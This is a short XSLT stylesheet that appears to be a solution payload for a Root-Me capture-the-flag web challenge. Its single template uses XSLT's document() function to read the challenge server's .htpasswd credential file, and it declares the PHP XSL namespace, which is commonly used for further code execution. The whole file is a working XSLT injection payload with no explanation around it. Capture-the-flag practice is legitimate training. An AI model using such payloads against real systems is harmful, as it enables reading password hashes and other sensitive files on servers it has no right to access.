<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of select="document('challenge01.root-me.org/web-serveur/ch50/.htpasswd')"/>
        </xsl:template>
</xsl:stylesheet>
